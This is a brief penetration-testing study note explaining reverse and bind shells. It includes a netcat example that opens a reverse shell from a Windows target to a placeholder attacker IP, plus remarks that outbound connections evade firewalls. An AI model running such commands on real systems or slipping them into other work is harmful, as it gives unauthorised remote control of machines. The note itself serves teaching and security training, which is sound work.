## Reverse Shells

### Explanation
- A reverse shell is a type of remote shell where the target connects back to a listener on the attacker's machine, consequently allowing for execution of commands on the target system. 
- You will use reverse shells 95% of the time
- With a reverse shell you do not necessarily need Netcat on the target. You just need a connection from the target back to the Netcat listener on the attack machine.
- Reverse shells also are harder to detect since the traffic is outbound from the target (and not inbound; most firewalls block inbound traffic).

### Example
```
nc -nvlp 1234                            # listener, on attack machine
nc -nv [attack ip] [port#] -e cmd.exe    # from target machine, Windows
```

## Bind Shells

### Explanation
- A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system.
  - This allows the execution of commands on the target system.
- A Netcat listener can be set up on the target to execute a specific executable like `cmd.exe` (or `powershell.exe`) or `/bin/bash` when the client (attacker) connects to the listener.

### The Problem
- The first problem with bind shells is getting Netcat on the target system and then using it to spin up a listener (on the target system).
- Secondly, most modern operating systems typically block inbound traffic using a firewall.

### The Solution
- Use a reverese shell because with a reverse shell, the rules are switched.
  - The attack machine sets up the listener.
  - You connect from the target machine, outbound, to the attack machine.
  - Outbound traffic is often less scrutinized than inbound traffic.
- And the result is the same: shell access to the target.
